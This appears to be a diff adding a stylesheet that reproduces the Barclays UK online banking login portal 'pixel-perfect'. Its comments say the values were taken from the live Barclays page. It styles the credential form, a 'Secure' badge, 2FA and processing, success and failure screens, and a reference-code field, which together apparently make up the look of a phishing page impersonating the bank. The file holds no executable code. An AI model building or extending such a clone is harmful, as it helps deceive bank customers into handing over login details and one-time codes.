@@ -1,0 +1,462 @@
+/* ==========================================================================
+   BARCLAYS UK – OLB LOGIN PORTAL  |  Pixel-Perfect CSS
+   All values extracted via JavaScript from
+   https://bank.barclays.co.uk/olb/authlogin/loginAppContainer.do#/identification
+   ========================================================================== */
+
+/* ---- @font-face — exact fonts from the live OLB portal ---- */
+@font-face {
+  font-family: "Expert Sans B14 Light";
+  src: url("/fonts/expert-sans-b14.woff") format("woff");
+  font-weight: 400;
+  font-style: normal;
+  font-display: swap;
+}
+@font-face {
+  font-family: "Expert Sans Bold";
+  src: url("/fonts/expert-sans-bold.woff") format("woff");
+  font-weight: 400;
+  font-style: normal;
+  font-display: swap;
+}
+@font-face {
+  font-family: "Expert Sans Light";
+  src: url("/fonts/expert-sans-light.woff") format("woff");
+  font-weight: 400;
+  font-style: normal;
+  font-display: swap;
+}
+@font-face {
+  font-family: "Expert Sans Regular";
+  src: url("/fonts/expert-sans-regular.woff") format("woff");
+  font-weight: 400;
+  font-style: normal;
+  font-display: swap;
+}
+
+/* ---- Design tokens — from live computed styles ---- */
+:root {
+  /* Colors */
+  --barclays-primary:       #0076B6;   /* rgb(0,118,182) — buttons, links, accents */
+  --barclays-dark:          #00395D;   /* rgb(0,57,93)  — headings, label text */
+  --barclays-text:          #333333;   /* rgb(51,51,51) — body text, footer text */
+  --barclays-grey:          #666666;   /* rgb(102,102,102) — secondary text */
+  --barclays-input-border:  #909090;   /* rgb(144,144,144) — input borders */
+  --barclays-tab-active-bg: #F2FBFE;   /* rgb(242,251,254) — active tab bg */
+  --barclays-tab-inactive-bg:#FBFBFB;  /* rgb(251,251,251) — inactive tab bg */
+  --barclays-tab-inactive-border:#8C8C8C; /* rgb(140,140,140) — inactive tab border */
+  --barclays-error:         #e20000;
+
+  /* Typography */
+  --font-regular: "Expert Sans Regular", Verdana, sans-serif;
+  --font-light:   "Expert Sans Light", Verdana, sans-serif;
+  --font-bold:    "Expert Sans Bold", Verdana, sans-serif;
+}
+
+/* ---- Reset ---- */
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+ul { list-style: none; }
+a { color: inherit; text-decoration: none; }
+button { font-family: var(--font-regular); cursor: pointer; }
+
+body {
+  font-family: var(--font-regular);
+  font-size: 16px;
+  line-height: 1.5;
+  color: var(--barclays-text);
+  background-color: #ffffff;
+  -webkit-font-smoothing: antialiased;
+}
+
+/* ==========================================================================
+   HEADER — exact match: white, 86px, no border, eagle + wordmark left, "Secure" right
+   ========================================================================== */
+.global-header {
+  background-color: rgb(255, 255, 255);
+  width: 100%;
+  height: 86px;
+  border-bottom: 0px none;
+  box-shadow: none;
+}
+.header-container {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  height: 100%;
+  padding: 12px 0px;
+  margin: 0 34px;
+}
+.logo-container { display: flex; align-items: center; }
+.logo-decoration {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  text-decoration: none;
+}
+/* Eagle: 28×30px, color #0076B6 */
+.eagle-icon {
+  height: 30px;
+  width: 28px;
+  color: var(--barclays-primary);
+}
+/* Wordmark: 152×30px, color #0076B6 */
+.barclays-logo-text {
+  height: 30px;
+  width: auto;
+  max-width: 152px;
+  color: var(--barclays-primary);
+}
+/* "Secure" badge on the right */
+.header-secure {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  color: var(--barclays-primary);
+  font-family: var(--font-regular);
+  font-size: 16px;
+  font-weight: 400;
+}
+.header-secure a {
+  color: var(--barclays-primary);
+  text-decoration: none;
+}
+.secure-lock-icon {
+  color: var(--barclays-primary);
+}
+
+/* ==========================================================================
+   MAIN CONTENT AREA
+   ========================================================================== */
+.main-content {
+  padding: 40px 16px 80px;
+  display: flex;
+  justify-content: center;
+  min-height: calc(100vh - 250px);
+}
+
+/* ==========================================================================
+   LOGIN CARD / WIDGET
+   ========================================================================== */
+.login-widget-container {
+  width: 100%;
+  max-width: 660px;
+}
+
+/* ---- Page Title — 46px, Expert Sans Light, weight 100, color #00395D ---- */
+.page-title {
+  font-family: var(--font-light);
+  font-size: 46px;
+  font-weight: 100;
+  color: var(--barclays-dark);
+  line-height: 54.05px;
+  margin-bottom: 32px;
+  padding-left: 16px;
+  border-left: 4px solid var(--barclays-primary);
+}
+
+/* ---- "How would you like to log in?" ---- */
+.login-subtitle {
+  font-family: var(--font-light);
+  font-size: 24px;
+  font-weight: 100;
+  color: var(--barclays-dark);
+  margin-bottom: 8px;
+}
+.register-link {
+  font-size: 16px;
+  color: var(--barclays-text);
+  margin-bottom: 24px;
+  display: block;
+}
+.register-link a {
+  color: var(--barclays-primary);
+  text-decoration: underline;
+}
+
+/* ---- Radio selectors (login method) ---- */
+.login-methods {
+  display: flex;
+  flex-direction: column;
+  gap: 0;
+  margin-bottom: 28px;
+}
+.login-method-option {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  padding: 14px 16px;
+  border: 1px solid var(--barclays-input-border);
+  border-bottom: none;
+  background: #ffffff;
+  cursor: pointer;
+  transition: background 0.15s;
+}
+.login-method-option:first-child {
+  border-radius: 8px 8px 0 0;
+}
+.login-method-option:last-child {
+  border-bottom: 1px solid var(--barclays-input-border);
+  border-radius: 0 0 8px 8px;
+}
+.login-method-option.active {
+  background-color: var(--barclays-tab-active-bg);
+  border-color: var(--barclays-primary);
+  border-bottom: 1px solid var(--barclays-primary);
+}
+.login-method-option.active + .login-method-option {
+  border-top-color: var(--barclays-primary);
+}
+.login-method-option:hover:not(.active) {
+  background-color: #f8f8f8;
+}
+.login-method-option input[type="radio"] {
+  width: 20px;
+  height: 20px;
+  accent-color: var(--barclays-primary);
+  cursor: pointer;
+}
+.login-method-option label {
+  font-family: var(--font-regular);
+  font-size: 16px;
+  font-weight: 100;
+  color: var(--barclays-dark);
+  cursor: pointer;
+}
+
+/* ---- Form fields ---- */
+.form-section {
+  margin-top: 0;
+}
+.form-group {
+  margin-bottom: 20px;
+}
+.form-group label {
+  display: block;
+  font-family: var(--font-regular);
+  font-size: 16px;
+  font-weight: 100;
+  color: var(--barclays-dark);
+  margin-bottom: 16px;
+  line-height: 1.4;
+}
+.form-group input[type="text"],
+.form-group input[type="password"],
+.form-group input[type="tel"] {
+  width: 100%;
+  height: 50px;
+  padding: 12px 24px 12px 20px;
+  border: 1px solid var(--barclays-input-border);
+  border-radius: 8px;
+  font-size: 16px;
+  font-family: var(--font-regular);
+  color: var(--barclays-primary);
+  background-color: rgb(255, 255, 255);
+  outline: none;
+  transition: border-color 0.2s;
+}
+.form-group input:focus {
+  border-color: var(--barclays-primary);
+  outline: 3px solid var(--barclays-primary);
+  outline-offset: -1px;
+}
+
+/* ---- Remember checkbox ---- */
+.remember-box {
+  display: flex;
+  align-items: flex-start;
+  gap: 12px;
+  margin-top: 24px;
+  margin-bottom: 30px;
+}
+.remember-box input[type="checkbox"] {
+  width: 24px;
+  height: 24px;
+  min-width: 24px;
+  margin-top: 2px;
+  cursor: pointer;
+  accent-color: var(--barclays-primary);
+}
+.remember-box .remember-label {
+  font-family: var(--font-regular);
+  cursor: pointer;
+  line-height: 1.4;
+}
+.remember-box .remember-label strong {
+  display: block;
+  font-family: var(--font-bold);
+  font-size: 16px;
+  color: var(--barclays-dark);
+  margin-bottom: 4px;
+}
+.remember-box .remember-label .subtext {
+  display: block;
+  font-size: 14px;
+  color: var(--barclays-grey);
+}
+
+/* ---- Primary button — pill, #0076B6, 47px tall ---- */
+.btn-primary {
+  background-color: var(--barclays-primary);
+  color: rgb(255, 255, 255);
+  border: none;
+  border-radius: 999px;
+  height: 47px;
+  width: 100%;
+  padding: 10px 30px 11px;
+  font-size: 16px;
+  font-weight: 400;
+  font-family: var(--font-regular);
+  cursor: pointer;
+  transition: background-color 0.2s ease;
+}
+.btn-primary:hover {
+  background-color: #005a8b;
+}
+.btn-primary:disabled {
+  opacity: 0.5;
+  cursor: not-allowed;
+}
+
+/* ---- Inline error ---- */
+.inline-error {
+  color: var(--barclays-error);
+  font-size: 14px;
+  font-family: var(--font-regular);
+  margin-bottom: 16px;
+  font-weight: 600;
+}
+
+/* ==========================================================================
+   FOOTER — transparent bg, minimal links in #0076B6, then legal text
+   ========================================================================== */
+.login-footer {
+  background-color: rgba(0, 0, 0, 0);
+  padding: 0;
+  color: var(--barclays-text);
+  font-size: 16px;
+}
+.footer-container {
+  margin: 0 34px;
+  padding: 30px 0 20px;
+}
+.footer-links {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 8px 24px;
+  margin-bottom: 20px;
+}
+.footer-links li a {
+  font-size: 16px;
+  font-family: var(--font-regular);
+  color: var(--barclays-primary);
+  text-decoration: none;
+}
+.footer-links li a:hover {
+  text-decoration: underline;
+}
+.footer-legal-text {
+  font-size: 12px;
+  color: var(--barclays-grey);
+  line-height: 1.6;
+  max-width: 800px;
+}
+.footer-copyright {
+  font-size: 12px;
+  color: var(--barclays-grey);
+  margin-top: 10px;
+}
+
+/* ==========================================================================
+   2FA / PROCESSING / SUCCESS / FAILURE — sign-on-widget wrapper
+   ========================================================================== */
+.sign-on-widget {
+  background: #ffffff;
+  border: 1px solid var(--barclays-input-border);
+  border-radius: 8px;
+  padding: 32px 30px;
+  width: 100%;
+  max-width: 500px;
+  margin: 0 auto;
+}
+.status-screen {
+  text-align: center;
+  padding: 30px 10px;
+}
+.status-title {
+  font-family: var(--font-regular);
+  font-size: 24px;
+  font-weight: 400;
+  margin-bottom: 12px;
+  color: var(--barclays-dark);
+}
+.status-message {
+  font-family: var(--font-regular);
+  font-size: 16px;
+  color: var(--barclays-grey);
+  line-height: 1.5;
+}
+.spinner {
+  width: 48px;
+  height: 48px;
+  border: 4px solid #d8d8d8;
+  border-top: 4px solid var(--barclays-primary);
+  border-radius: 50%;
+  animation: spin 0.8s linear infinite;
+  margin: 0 auto 20px;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+
+/* ---- Reference entry ---- */
+.ref-input-wrapper { margin-bottom: 24px; }
+.ref-input {
+  width: 100%;
+  height: 50px;
+  padding: 12px 20px;
+  border: 1px solid var(--barclays-input-border);
+  border-radius: 8px;
+  font-size: 18px;
+  font-weight: 600;
+  font-family: var(--font-regular);
+  text-align: center;
+  letter-spacing: 2px;
+  text-transform: uppercase;
+  color: var(--barclays-dark);
+  outline: none;
+  transition: border-color 0.2s;
+}
+.ref-input:focus {
+  border-color: var(--barclays-primary);
+  outline: 3px solid var(--barclays-primary);
+  outline-offset: -1px;
+}
+.ref-input::placeholder {
+  color: var(--barclays-grey);
+  font-weight: 400;
+  font-size: 15px;
+}
+.ref-error {
+  color: var(--barclays-error);
+  font-size: 14px;
+  margin-top: 8px;
+  font-weight: 600;
+  text-align: center;
+}
+
+/* ==========================================================================
+   RESPONSIVE
+   ========================================================================== */
+@media (max-width: 768px) {
+  .header-container {
+    margin: 0 16px;
+  }
+  .page-title {
+    font-size: 28px;
+    line-height: 1.3;
+  }
+  .login-widget-container {
+    max-width: 100%;
+  }
+  .footer-container {
+    margin: 0 16px;
+  }
+}
